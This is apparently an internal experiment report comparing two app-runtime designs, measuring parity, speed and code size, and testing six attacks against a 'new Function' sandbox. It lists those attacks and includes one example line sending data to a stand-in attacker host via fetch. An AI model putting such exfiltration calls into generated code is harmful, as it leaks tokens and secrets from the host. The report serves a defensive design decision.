# exp-04 · RESULT (partial)

**Date:** 2026-04-27
**State:** 🟡 **Partial — A and B measured, C deferred to deploy pass**

## Numbers

### Frame parity
**6/6 frames identical** between candidate A (DO class) and candidate B
(JSON manifest + sandbox) for the same input script. The protocol abstraction
holds — both candidates reduce to the same wire output.

### Performance (hot path, 1000 iterations, on Bun, M1 Mac)

| Candidate | p50 input→frame | p99 input→frame |
|---|---|---|
| A — TS DO class | 0.12 µs | 1.21 µs |
| B — JSON manifest + `new Function` sandbox | 0.08 µs | 1.04 µs |

Both are dwarfed by the network round-trip (10–100ms). For the counter app,
**performance is not the differentiator.**

### Code size (counter app only, not runtime)

| Candidate | Bytes | Lines |
|---|---|---|
| A — TS class | 1,171 | 40 |
| B — JSON manifest | 584 | 17 |
| B's runtime (host-side, written once) | 1,838 | 45 |

The JSON manifest is **half the size** of the TS class for the same app.
Critically, B's app is *data*, which means it can be generated by an LLM
without code-generation pitfalls (no syntax errors, no imports, no types).

## Security — actual measured attacks

Six attacks attempted against candidate B's `new Function` sandbox.
**Five succeed, one was not safely runnable.**

| # | Attack | Result |
|---|---|---|
| 1 | Read globals | ✅ **leaked 86 globalThis keys** |
| 2 | Read env vars | ✅ **leaked 54 env var names** |
| 3 | Outbound fetch | ✅ **fetch is fully available** |
| 4 | Read filesystem via `require` | ⛔ blocked (only because `require` undefined in this runtime) |
| 5 | Hang the host with `while(true)` | ⚠️ **not run** — no execution timeout exists; would block the entire process indefinitely |
| 6 | Read another app's in-memory state | ⛔ not directly (closure scope holds), but #1 leaks `globalThis` which production Workers might attach app instances to |

## The honest conclusion

### Candidate A (TS DO class) is shippable today.

- All security properties come from Cloudflare's Worker isolate, which is
  battle-tested.
- Cost: app authors must write TypeScript, ship through `wrangler deploy`,
  and get a real Worker per app. Operationally heavy. Not a fit for the
  prompt→app loop the README promises.

### Candidate B (JSON manifest) is **NOT shippable** in the form built here.

- `new Function` is not a sandbox. It is `eval` with a fresh scope.
- An LLM-generated handler containing `fetch('https://attacker.com', {...})`
  would *successfully exfiltrate* anything the host process can see —
  including other apps' tokens, env vars, and outbound network.
- `while(true)` is unsurvivable; there is no way to abort a synchronous JS
  function from JS itself.

### Candidate B is the right *shape* — wrong *runtime*.

The data-as-app model is correct. The `new Function` runtime is wrong. The
two real options for B's production runtime, in increasing seriousness:

- **B′ — QuickJS-in-WASM** running inside a Cloudflare Worker. Real isolate
  boundary, real execution timeout, no host APIs unless explicitly wired.
  Production-shippable. Adds ~500KB to the fabric Worker.
- **B″ — Workers for Platforms** (dispatch namespaces). Each app is its own
  real Worker isolate, dispatched dynamically. Cloudflare's blessed model
  for "user-uploaded code." Strongest isolation; per-app billing.

Both preserve B's "app is data + handlers" model. Both close the five
attacks above.

## Decision (recorded in DECISIONS.md)

> **App format:** desk apps are **JSON manifests with handler bodies**
> (candidate-B shape), executed inside a real isolate boundary (B′ QuickJS
> or B″ Workers-for-Platforms). The naive `new Function` host runtime built
> in this experiment is a **debug-only** local-mode tool, never the
> production path. Candidate A (full TS DO class) remains available as an
> **escape hatch** for power users; it is not the prompt→app default.
